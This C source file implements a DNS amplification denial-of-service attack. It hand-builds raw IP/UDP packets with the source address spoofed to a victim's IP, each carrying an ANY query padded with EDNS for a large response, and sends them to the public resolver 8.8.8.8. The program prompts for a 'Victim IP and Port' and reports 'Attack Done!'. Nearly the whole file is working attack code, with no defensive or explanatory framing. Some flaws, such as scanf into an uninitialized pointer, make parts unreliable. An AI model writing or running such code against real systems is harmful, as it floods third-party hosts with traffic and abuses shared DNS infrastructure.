  #include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

#include <sys/time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#include <unistd.h>

typedef struct iphdr IPheader;

typedef struct udphdr UDPheader;

typedef struct
{
	unsigned short id; //query id 16
	unsigned short dnsflag;
	unsigned short questcount;
	unsigned short anscount;
	unsigned short authrr; //resource record
	unsigned short additionalrr;
}DNShdr;

typedef struct
{
	unsigned short Qtype;
	unsigned short Qclass;
}Query;
//for UDP checksum so create pseudoheader(include some IPv4 info)
typedef struct
{
	unsigned int sourceip_addr; //32
	unsigned int destip_addr;
	unsigned char zeros; //all 0
	unsigned char protocol; //8
	unsigned short udptotalen;
}pseudohdr;

//use edns to amplification attack
#pragma pack(push,1) //alignment data(avoid compiler auto alignment)
typedef struct eDNS
{
	unsigned char name;//8 域名
	unsigned short type;//16
	unsigned short UDPlength;//16
	unsigned char retur;//8
	unsigned char EDNSversion;//8
	unsigned short Z;//16 後續擴展協議
	unsigned short datalength;//16 
}eDNS;
#pragma pack(pop)

//checksum
unsigned short csum(unsigned short *buf , int nbytes)
{
	unsigned long sum;
	unsigned short odd;

	sum = 0;
	while(nbytes > 1){
		sum += *buf++;
		nbytes-=2;
	}
	if(nbytes == 1){
		odd = 0;
		*((unsigned char*)&odd) = *(unsigned char*)buf;
		sum += odd;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);

	return((short)~sum);
}

//question name use label DNS format (count) //3www5yahoo3com
void dns_fqdn(unsigned char *dns , unsigned char *host)
{
	int index = 0;
	int n = 0;
	strcat((char*)host,".");
	for(n = 0; n<strlen((char*)host); n++){
		if(host[n] == '.'){
			*dns++= n - index;
			for(; index<n; index++){
				*dns++=host[index];
			}
			index++;
		}
	}
	*dns++=0x00;
}

//create DNS header
void dns_header(DNShdr *dns)
{
	dns->id = (unsigned short) htons(getpid());
	dns->dnsflag = htons(0x0100);
	dns->questcount = htons(1);
	dns->anscount = 0;
	dns->authrr = 0;
	dns->additionalrr = htons(1);
}

void DNS_attack(char *targetIP, int target, char *dns_server, int dnsport, unsigned char *dns_record)
{
	unsigned char data[128+12];//eDNS increase size

	DNShdr *dns = (DNShdr *)&data;
	dns_header(dns);

	unsigned char *dns_name;
	unsigned char dns_rec[32];
	dns_name = (unsigned char *)&data[sizeof(DNShdr)];
	strcpy(dns_rec , dns_record);
	dns_fqdn(dns_name , dns_rec);

	//information query
	Query *Q;
	Q = (Query *)&data[sizeof(DNShdr) + (strlen(dns_name)+1)];
	Q->Qtype = htons(0x00ff); //255
	Q->Qclass = htons(0x1);

	//to amplification construct EDNS info
	struct eDNS *edns = (struct eDNS*)(&data[sizeof(DNShdr) + (strlen(dns_name)+1)] + sizeof(Query));
	edns->name = 0;
	edns->type = htons(41);
	edns->UDPlength = htons(4096);
	edns->retur = 0;
	edns->EDNSversion = 0;
	edns->Z = htons(0x8000);
	edns->datalength = 0;

	//build IP and UDP header
	char datagram[4096];
	char *datag;
	char *gram;
	memset(datagram , 0 , 4096);

	datag = datagram + sizeof(IPheader) + sizeof(UDPheader);
	memcpy(datag, &data, sizeof(DNShdr) + (strlen(dns_name)+1) + sizeof(Query) + sizeof(eDNS));

	//socket // AF_INET:IP protocol family IPv4 //inet_addr:turn addr to binary format
	struct sockaddr_in sockin;
	sockin.sin_family = AF_INET;
	sockin.sin_port = htons(dnsport);
	sockin.sin_addr.s_addr = inet_addr(dns_server);

	//IP //IPPROTO_UDP:user datagram protocol
	IPheader *IP = (IPheader *)datagram;
	IP->version = 4;
    IP->ihl = 5;
    IP->tos = 0;
    IP->tot_len = sizeof(IPheader) + sizeof(UDPheader) + sizeof(DNShdr) + (strlen(dns_name)+1) + sizeof(Query)+sizeof(eDNS);
    IP->id = htonl(getpid());
    IP->frag_off = 0;
    IP->ttl = 64;
    IP->protocol = IPPROTO_UDP;
    IP->check = 0;
    IP->saddr = inet_addr(targetIP);
    IP->daddr = sockin.sin_addr.s_addr;
    IP->check = csum((unsigned short *)datagram, IP->tot_len);

    //UDP
    UDPheader *UDP = (UDPheader *)(datagram + sizeof(IPheader));
    UDP->source = htons(target);
    UDP->dest = htons(dnsport);
    UDP->len = htons(8+sizeof(DNShdr)+(strlen(dns_name)+1)+sizeof(Query)+sizeof(eDNS));
    UDP->check = 0;

    pseudohdr pseudohdr;
    pseudohdr.sourceip_addr = inet_addr(targetIP);
    pseudohdr.destip_addr = sockin.sin_addr.s_addr;
    pseudohdr.zeros = 0;
    pseudohdr.protocol = IPPROTO_UDP;
    pseudohdr.udptotalen = htons(sizeof(UDPheader) + sizeof(DNShdr) + (strlen(dns_name)+1) + sizeof(Query) + sizeof(eDNS));

    int packetsize  = sizeof(pseudohdr) + sizeof(UDPheader) + sizeof(DNShdr) + (strlen(dns_name)+1) + sizeof(Query) + sizeof(eDNS); 
    gram = malloc(packetsize);
    memcpy(gram, (char *)&pseudohdr, sizeof(pseudohdr));
    memcpy(gram + sizeof(pseudohdr), UDP, sizeof(UDPheader) + sizeof(DNShdr) + (strlen(dns_name)+1) + sizeof(Query) + sizeof(eDNS));

    UDP->check = csum((unsigned short *)gram, packetsize);

    //opening socket to send
    //IPPROTO_RAW:Raw IP socket
    int send = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(send == -1)
    	printf("Error in create socket!");
    else
    	sendto(send, datagram, IP->tot_len, 0, (struct sockaddr *)&sockin, sizeof(sockin));
    free(gram);
    close(send);
}

int main()
{
	char *targetIP ;
	int targetPort ;
	int cnt = 10,i=0;
	
	printf("Please Enter Victim IP and Port: ");
	scanf("%s %d",targetIP,&targetPort);
	
	for(i = 0; i < cnt; i ++){
		DNS_attack(targetIP, targetPort, "8.8.8.8", 53, "ieee.org");//twitch.tv
	}
    printf("Attack Done!\n");
	return 0;
}
